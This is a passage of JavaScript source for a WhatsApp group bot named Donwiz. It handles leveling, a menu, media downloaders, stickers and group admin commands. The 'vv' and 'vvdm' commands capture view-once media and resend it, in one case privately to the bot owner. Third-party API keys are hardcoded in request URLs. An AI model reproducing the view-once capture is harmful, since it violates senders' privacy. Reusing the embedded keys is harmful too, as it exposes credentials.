return donwiz.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: pp, title: `${global.botname}`, body: `${runtime(process.uptime())}`, previewType: "PHOTO"}}}, {quoted: m})
}   

        try {
            ppuser = await donwiz.profilePictureUrl(m.sender, 'image')
        } catch (err) {
            ppuser = 'https://raw.githubusercontent.com/latesturl/dbCDN/refs/heads/main/my-DB/profile.jpg'
        }
        ppnyauser = await getBuffer(ppuser)

        const reSize = async (buffer, ukur1, ukur2) => {
            return new Promise(async (resolve, reject) => {
                let jimp = require('jimp')
                var baper = await jimp.read(buffer);
                var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
                resolve(ab)
            })
        }
        const fkethmb = await reSize(ppuser, 300, 300)
        let jimp = require("jimp")
        const resize = async (image, width, height) => {
            const read = await jimp.read(image);
            const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
            return data;
        };
        
        
              async function ranke(idnya) {
          var rrole = global.db.users[idnya].level
          var rank = 'Bronze'
          var rankid = 1
          if (rrole <= 1) {
            rank = 'Bronze'
            rankid = 1
          } else if (rrole <= 2) {
            rank = 'Bronze'
            rankid = 2
          } else if (rrole <= 3) {
            rank = 'Bronze'
            rankid = 3
          } else if (rrole <= 4) {
            rank = 'Silver'
            rankid = 1
          } else if (rrole <= 5) {
            rank = 'Silver'
            rankid = 2
          } else if (rrole <= 6) {
            rank = 'Silver'
            rankid = 3
          } else if (rrole <= 7) {
            rank = 'Gold'
            rankid = 1
          } else if (rrole <= 8) {
            rank = 'Gold'
            rankid = 2
          } else if (rrole <= 9) {
            rank = 'Gold'
            rankid = 3
          } else if (rrole <= 10) {
            rank = 'Diamond'
            rankid = 1
          } else if (rrole <= 11) {
            rank = 'Diamond'
            rankid = 2
          } else if (rrole <= 12) {
            rank = 'Diamond'
            rankid = 3
          } else if (rrole <= 13) {
            rank = 'Heroic'
            rankid = 1
          } else if (rrole <= 14) {
            rank = 'Master'
            rankid = 2
          } else if (rrole <= 15) {
            rank = 'Grandmaster'
            rankid = 0
          }
          return { rank, rankid }
        }
        
        try {
          ppuser = await donwiz.profilePictureUrl(m.sender, 'image')
        } catch {
          ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
        }
        
        async function addLevel(userId, xp, db, m) {
          let user = db.users[userId]
          if (!user) {
            user = { level: 0, exp: 0 }
            db.users[userId] = user
          }
          
          const leveledUp = leveling.autoLevelUp(user, xp)
          if (leveledUp) {
            await handleLevelUp(user, m)
          } else if (user.level >= 15) {
            await notifyMaxLevel(user, m)
          }
        }
        
        
        async function handleLevelUp(user, m) {
            let txt = `*🎉 Success! Level Up!*
  *User:*${m.pushName}  
  *Level:*${user.level - 1} → ${user.level}  
  *Exp:*${user.exp}  
  © 𝓢𝓾𝓬𝓮𝓼𝓼 𝓫𝔂 𝓟𝓲𝔁𝓮𝓵 𝔀𝓪 𝓫𝓸𝓽`
            
        if (menutype === 'v1') {
                    donwiz.sendMessage(m.chat, {
                        text: txt,
                        contextInfo: {
                            externalAdReply: {
                              showAdAttribution: true,
                                title: botname,
                                body: 'level up ✨️',
                                thumbnailUrl: ppuser,
                                sourceUrl: '',
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
} else if (menutype === 'v2' ) {
                    donwiz.sendMessage(m.chat, { text: txt }, {
                        quoted: m
                    })
 } else if (menutype === 'v3' )
 {
await   donwiz.sendMessage(m.chat, { image: { url: ppuser }, caption: txt }, { quoted: m })
}
}
 
 if (global.db && global.db.settings && global.db.settings.levelup) {
 if (isCmd || isCmd2 && !m.fromMe) {
    const xp = randomNomor(39, 89)
    addLevel(m.sender, xp, global.db, m)
}
}

async function catbox(content) {
  const { ext, mime } = (await fromBuffer(content)) || {};

  const formData = new BodyForm();
  const random = crypto.randomBytes(5).toString("hex");
  formData.append("reqtype", "fileupload");
  //formData.append("fileToUpload", blob, randomBytes + "." + ext);
  formData.append('fileToUpload', content, { filename: "tmp"+random + '.' + ext, contentType: mime });

  const response = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: formData,
    headers: {
      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
      //...formData.getHeaders(),
    },
  });

  return await response.text();
}       

const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}



let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"))
const donwizdev = { donwiz, isOwner, command, isCmd, isCmd2, text, runtime, mime, sleep, speed, botNumber, pushname, example, isGroup, groupMetadata, isBotAdmins, isGroupAdmins, isAdmins, reply4}
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, donwizdev)
}
}
if (!pluginsDisable) return

        
switch (command) {
        
case "play": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("_love songs_"))
m.reply(`Downloading ${text} please wait...`)
let ytsSearchl = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await donwiz.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"},{quoted: m})
} else {
return m.reply("_Error! Result Not Found_")
}
}
break
//================================================================================

 case 'menu':

case 'help': {

  if (m.isGroup) {

    if (global.db.groups[m.chat]?.banned) return;

  }

  if (global.db.users[m.sender]?.banned) return m.reply(global.msg.ban);

  let timestampe = speed();

  let latensi = speed() - timestampe;

  let welDate = moment.tz(global.timezone).format('DD/MM/YYYY');

  let pixelmenu =  `┏━《 ${global.botname} 》━━━

▢ User: ${m.pushName}

≡ Ping: ${latensi.toFixed(4)}

⧖ Time: ${getTime().split("T")[1].split("+")[0]}

✶ Date: ${welDate}

⚙ Platform: ${nou.os.type()}

▤ Memory: ${formatp(os.totalmem() - os.freemem())}

∞ Runtime: ${run(process.uptime())} 

☐ Device: ${getDevice(m.quoted ? m.quoted.id : m.key.id)}

┗━━━━━━━━━━━━━━━━━━━━━

━━━━━━━━━━━━━━━━━━━━━━

*OWNER MENU*:

› .owner

› .setname

› .setbio

› .block

› .unblock

› .bc

*DOWNLOAD MENU*:

› .ytmp3

› .ytmp4

› .instagram

› .facebook

*GAME MENU*:

› .guess

› .flip

› .truth

*GROUP MENU*:

› .kick

› .add

› .promote

› .demote

*AI MENU*:

› .chatgpt

› .stablediffusion

*CONVERT MENU*:

› .toimage

› .tomp3

› .tovn

*SEARCH MENU*:

› .google

› .play

*LOGO MENU*:

› .logo

*OTHERS MENU*:

› .ping

› .help

© Donwiz Bot

`;
    if (global.menutype === 'v1') {

    await donwiz.sendMessage(m.chat, {

      text: pixelmenu,

      contextInfo: {

        externalAdReply: {

          showAdAttribution: true,

          title: global.botname,

          body: 'Dᴏɴᴡɪᴢ 〄',

          thumbnailUrl: global.thumb,

          sourceUrl: ' ',

          mediaType: 1,

          renderLargerThumbnail: true

        }

      }

    }, { quoted: m });

  } else if (global.menutype === 'v2') {

    await donwiz.sendMessage(m.chat, { text: pixelmenu }, { quoted: m });

  } else if (global.menutype === 'v3') {

    await donwiz.sendMessage(m.chat, { image: { url: global.thumb }, caption: pixelmenu }, { quoted: m });

  }
}
  break;
  //================================================================================      
        
case "video": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("_love song_"))
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp4(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await donwiz.sendMessage(m.chat, {video: {url: urlMp3}, ptv: false, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("_Error! Result Not Found_")
}
}
break

//===============================================================================

case "yts": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example('_love songs_'))
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "*[ YouTube search result ⌛]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Duration :* ${res.timestamp}
* *Uploaded :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Channel URL :* ${res?.author?.url || "Unavailable"}
* *Subscribers :* ${res?.author?.subscriber_count || "Hidden"}
* *Source :* ${res.url}
* *Likes :* ${res.likes || "N/A"}
* *Description :* ${res.description?.slice(0, 200) || "No description available..."}\n\n`
}
await m.reply(teks)
}
break

//===============================================================================

case "ytmp3": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("_youtube vid link_"))
if (!text.startsWith("https://")) return m.reply("_please input a valid youtube link_")

var anu = await ytdl.ytmp3(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await donwiz.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
}
break
//================================================================================

case "ytmp4": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("_youtube vid link_"))
if (!text.startsWith("https://")) return m.reply("_please input a valid YouTube link_")
var anu = await ytdl.ytmp4(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await donwiz.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("_Error! Result Not Found_")
}
}
break

//===============================================================================

case 'mediafire': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!args[0]) return m.reply(example("https://www.mediafire.com/file/xxxxxxxxxx"))
if (!args[0].startsWith("https://")) return m.reply("please input a valid mediafire link")
try {
let url = args[0]
let api = await fetch(`https://api.agatz.xyz/api/mediafire?url=${url}`)
let res = await api.json()
let data = res.data[0]
let caption = `*MediaFire Downloader* -\n_Name: ${data.nama}_\n_Size: ${data.size}_\n_Extension: ${data.mime}_\n_Link: ${data.link}_`
await donwiz.sendMessage(m.chat, { document: { url: data.link }, mimetype: data.mime, fileName: data.nama, caption: caption }, { quoted: m })
} catch (error) {
console.log(error)
m.reply(error)
}
} 
break
//================================================================================

case "tiktokmp3": case "ttmp3": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("input tiktok link"))
if (!text.startsWith('https://')) return m.reply("the link you input is invalid")
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await donwiz.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

case 'tourl': case 'url':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
    let q = m.quoted ? m.quoted : m
  let mime = (q.msg || q).mimetype || ''
  if (!mime) return m.reply('No media found')
  let media = await q.download()
  let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
  let link = await uploadImage(media)
  let caption = `${link}`
  m.reply(caption)
}
break

//================================================================================


case "github": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("https://github.com/Ednut001/arch-md"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link you input is invalid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    donwiz.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! Repository not found`)
}}
break

//================================================================================


case "ssweb": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await donwiz.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

case 'google': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
 if (!text) return m.reply(example('how to deploy pixel md'))
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google result for: ${text}\n\n`
for (let g of res) {
teks += `*Title* : ${g.title}\n`
teks += `*Description* : ${g.snippet}\n`
teks += `*Channel* : ${g.channel || 'Unknown'}\n`
teks += `*Published* : ${g.published || 'Unknown date'}\n`
teks += `*Link* : ${g.url || 'No link'}\n${g.link}\n\n───────────────────\n\n`
} 
m.reply(teks)
})
}
break

//================================================================================

case "shortlink": case "shorturl": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
let res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `${res.data.toString()}`
return m.reply(link)
}
break


case "shortlink-dl": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await donwiz.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//================================================================================

case "idgc": case "jid": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
m.reply(m.chat)
}
break

case 'gcinfo': case 'groupinfo': {
if (!m.isGroup) return m.reply(msg.group)

let metadata = await donwiz.groupMetadata(m.chat)
// get group profile picture 
try {
ppgc = await donwiz.profilePictureUrl(m.chat, 'image')
} catch (err) {
ppgc = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
    }
ppnyauser = await getBuffer(ppgc)
let group = metadata.id;
let subject = metadata.subject;
let members = metadata.size;
let owner = metadata.owner || 'no owner';
let desc = metadata.desc || 'no description';
let access = metadata.announce;
let check = metadata.joinApprovalMode;
let created = metadata.creation;
let community = metadata.isCommunity;
let welcome = global.db.groups[m.chat].welcome;
let goodbye = global.db.groups[m.chat].goodbye;
let antilink1 = global.db.groups[m.chat].antilink;
let antilink2 = global.db.groups[m.chat].antilink2;
let antilink3 = global.db.groups[m.chat].antilink3;
let antibot = global.db.groups[m.chat].antibot;
let antitag = global.db.groups[m.chat].antitag;
let antilinkAction;
if (antilink1 === true) {
  antilinkAction = 'kick';
} else if (antilink2 === true) {
  antilinkAction = 'delete';
} else if (antilink3 === true) {
  antilinkAction = 'warn';
}


let caption = `Name: ${subject}
id: ${group}
participant: ${members}
owner: ${owner}
announcement: ${access}
approval: ${check}
community: ${community}
created at: ${new Date(created * 1000).toLocaleString()}
description: ${desc}
welcome: ${welcome ? "on" : "off"}
Goodbye: ${goodbye ? "on" : "off"}
antilink: ${antilinkAction || 'off'}
antibot: ${antibot ? "on" : "off"}
antitag: ${antitag ? "on" : "off"}`

donwiz.sendMessage(m.chat, { image: { url: ppgc }, caption: caption }, { quoted: m });
}
break

//================================================================================

case "listgc": case "listgroup": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return
let teks = `\n *乂 List all group chat*\n`
let a = await donwiz.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Name :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Open": "closed"}
* *Owner :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Already out"}\n`
}
return m.reply(teks)
}
break

//================================================================================

//================================================================================

case 'sticker': case 's': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!/image|video/.test(mime)) return m.reply(example("reply to a image or video"))   
let getRandom = (ext) => {
return `${Math.floor(Math.random() * 10000)}${ext}`
  }
	let ahuh = args.join(' ').split('|')
	let satu = ahuh[0] !== '' ? ahuh[0] : (global.author)
	let dua = typeof ahuh[1] !== 'undefined' ? ahuh[1] : ``
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = await donwiz.downloadAndSaveMediaMessage(quoted)
	let jancok = new Sticker(media, {
	pack: satu, // The pack name
	author: dua, // The author name
	type: StickerTypes.FULL, // The sticker type
	categories: ['🤩', '🎉'], // The sticker category
	id: '12345', // The sticker id
	quality: 70, // The quality of the output file
	background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await donwiz.sendMessage(m.chat,{sticker: nah},{quoted: m})
	await fs.unlinkSync(stok)
	await fs.unlinkSync(media)
}
break
//================================================================================

case "vv": case "readviewonce": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
    if (!isMedia) {
        return m.reply(`*Reply to an image, video, or audio with the caption ${prefix + command}*`);
    }

    let mime = (m.quoted.msg || m.quoted).mimetype || '';
    try {
        if (/image/.test(mime)) {
            let media = await m.quoted.download();
            await donwiz.sendMessage(m.chat, {
                image: media,
                caption: "",
            }, { quoted: m });

        } else if (/video/.test(mime)) {
            let media = await m.quoted.download();
            await donwiz.sendMessage(m.chat, {
                video: media,
                caption: "",
            }, { quoted: m });

        } else if (/audio/.test(mime)) {
            let media = await m.quoted.download();
            await donwiz.sendMessage(m.chat, {
                audio: media,
                mimetype: 'audio/mpeg',
                ptt: true // Set to true if you want to send as a voice note
            }, { quoted: m });

        } else {
            m.reply(` Unsupported media type!\nReply to an image, video, or audio with *${prefix + command}*`);
        }
    } catch (err) {
        console.error('Error processing media:', err);
        m.reply(` Failed to process media. Please try again.`);
    }
}
break

case "vvdm": case "readviewonce2": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
    if (!m.quoted) {
        return m.reply(`*Reply to an image, video, or audio with the caption ${prefix + command}*`);
    }

    let mime = (m.quoted.msg || m.quoted).mimetype || '';
    try {
        if (/image/.test(mime)) {
            let media = await m.quoted.download();
            await donwiz.sendMessage(botNumber, {
                image: media,
                caption: " ",
            }, { quoted: m });

        } else if (/video/.test(mime)) {
            let media = await m.quoted.download();
            await donwiz.sendMessage(botNumber, {
                video: media,
                caption: "",
            }, { quoted: m });

        } else if (/audio/.test(mime)) {
            let media = await m.quoted.download();
            await donwiz.sendMessage(botNumber, {
                audio: media,
                mimetype: 'audio/mpeg',
                ptt: true // Set to true if you want to send as a voice note
            }, { quoted: m });

        } else {
            m.reply(` Unsupported media type!\nReply to an image, video, or audio with *${prefix + command}*`);
        }
    } catch (err) {
        console.error('Error processing media:', err);
        m.reply(` Failed to process media. Please try again.`);
    }
}
break

case 'lyrics': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  try {
    let title = m.text.split(" ")[1];
    if (!title) return m.reply("Please provide a song title");
    let res = await fetch(`https://api-versevibe.zone.id/versev2/lyrics?title=${encodeURIComponent(title)}&apikey=AbroCodesf9Dg7`);
    let data = await res.json();
    if (!data || !data.lyrics) return m.reply("Lyrics not found");
    m.reply(data.lyrics);
  } catch (e) {
    m.reply("Error fetching lyrics");
  }
}
break;

//================================================================================

case "tr": case "translate": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("en good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("en good night"))
if (args.length < 1) return m.reply(example("en good night"))
if (!m.quoted.text) return m.reply(example("en good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("en good night"))
}}
break

//================================================================================

case 'hd':
case 'remini':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!/image/.test(mime)) return m.reply(`reply to the image ${prefix + command}`)
try {
const { remini } = require('./all/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance")
await donwiz.sendMessage(m.chat, { image: proses, caption: `𝓢𝓾𝓬𝓮𝓼𝓼 𝓫𝔂 𝓟𝓲𝔁𝓮𝓵 𝔀𝓪 𝓫𝓸𝓽`}, { quoted: m})
} catch {
await m.reply('error')
}
}
break

//================================================================================
case "add": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isOwner) return m.reply(msg.owner)
if (!isBotAdmins) return m.reply(msg.botAdmin)
let input;
if (m.quoted) {
input = m.quoted.sender;
} else if (text) {
input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
} else {
return m.reply(example("234### or reply to the user's message"))
}
var onWa = await donwiz.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("input a valid whatsapp number")
const metadata = await donwiz.groupMetadata(m.chat)
const members = metadata.participants.map(p => p.id)
if (members.includes(input)) {
return m.reply(`${input.split("@")[0]} is already in the group.`)
} else {
await donwiz.groupParticipantsUpdate(m.chat, [input], 'add')
return m.reply(`User ${input.split("@")[0]} added to the group chat`)
}
} 
break
//================================================================================

case "kick": case "fling": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!m.isGroup) return m.reply(msg.group)
 if (!(isAdmins || isOwner)) return m.reply(msg.admin)
  if (!isBotAdmins) return m.reply(msg.botAdmin)
  if (text || m.quoted) {
    const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
    var onWa = await donwiz.onWhatsApp(input.split("@")[0])
    if (onWa.length < 1) return m.reply("Input a valid WhatsApp number")
    const metadata = await donwiz.groupMetadata(m.chat)
    const members = metadata.participants.map(p => p.id)
    if (!members.includes(input)) {
      await m.reply(`User ${input.split("@")[0]} has been kicked/left `)
    } else {
      const res = await donwiz.groupParticipantsUpdate(m.chat, [input], 'remove')
      await m.reply(`User ${input.split("@")[0]} kicked.`)
    }
  } else {
    return m.reply(example("@tag/reply"))
  }
} 
break
//================================================================================

case "leave": case "left": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!isOwner) return m.reply(msg.owner)
  if (!m.isGroup) return m.reply(msg.group)
  await sleep(2000)
  await donwiz.groupLeave(m.chat)
} 
break

case "resetlinkgc":  
case "reset": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (!m.isGroup) return m.reply(msg.group)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (!isOwner || !isAdmins) return m.reply(msg.admin)
await donwiz.groupRevokeInvite(m.chat)
m.reply("Group link successfully resetted ")
}
break

//================================================================================
case 'tagall': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!m.isGroup) return m.reply(msg.group)
  if (!(isAdmins || isOwner)) return m.reply(msg.admin)
let teks = `Message : ${text ? text : 'none'}\n\n`
for (let mem of participants) {
teks += `${global.simbol} @${mem.id.split('@')[0]}\n`
}
await donwiz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

case 'tagadmin': case 'listadmin': case 'admin':{
if (!isGroup) return reply(msg.group)
const groupAdmins = participants.filter(p => p.admin)
const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
${listAdmin}
`.trim()
await donwiz.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
}
break

//================================================================================

case "linkgc": 
case "invite":  {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (!(isAdmins || isOwner)) return m.reply(msg.admin)
const urlGrup = "https://chat.whatsapp.com/" + await donwiz.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await donwiz.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "joingc": case "join": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("group link"))
if (!text.includes("chat.whatsapp.com")) return m.reply("the given link is invalid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await donwiz.groupAcceptInvite(result)
m.reply(`Successfully joined the group`)
}
break

//================================================================================

case "get": case "g": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

//================================================================================

case "mute":
case "mute": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!m.isGroup) return m.reply(msg.group)
  if (!isBotAdmins) return m.reply(msg.botAdmin)
 if (!(isAdmins || isOwner)) return m.reply(msg.admin)
  if (groupMetadata.announce == false) {
    await donwiz.groupSettingUpdate(m.chat, 'announcement')
    m.reply(`muted!`)
  } else {
    m.reply(`Group is muted!`)
  }
} 
break;

case "unmute":
case "unmute": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!m.isGroup) return m.reply(msg.group)
  if (!isBotAdmins) return m.reply(msg.botAdmin)
 if (!(isAdmins || isOwner)) return m.reply(msg.admin)
  if (groupMetadata.announce == true) {
    await donwiz.groupSettingUpdate(m.chat, 'not_announcement')
    m.reply(`Group opened!`)
  } else {
    m.reply(`Group is open!`)
  }
} 
break;


//================================================================================


case "donwiz": case "creator": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
await donwiz.sendContact(m.chat, ['2349131021928'], m)
}
break


//================================================================================

case "ping": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info(); 
m.reply('_Ping!..._')
await sleep(2000)
let respon = `_*• pong* ${latensi.toFixed(4)} sec_`
await m.reply(respon)
}
break

//================================================================================

case "addsudo": case "setsudo": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (setsudo.includes(orang)) return m.reply(`_User ${orang.split('@')[0]} existed as a sudo before_`)
await setsudo.push(orang)
await fs.writeFileSync("./all/database/owner.json", JSON.stringify(setsudo))
m.reply(`_succesfully added ${orang.split('@')[0]} as a sudo number_`)
} else {
return m.reply(example("/@tag/234XXX/reply to chat"))
}}
break

case "delsudo": case "removesudo":  {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
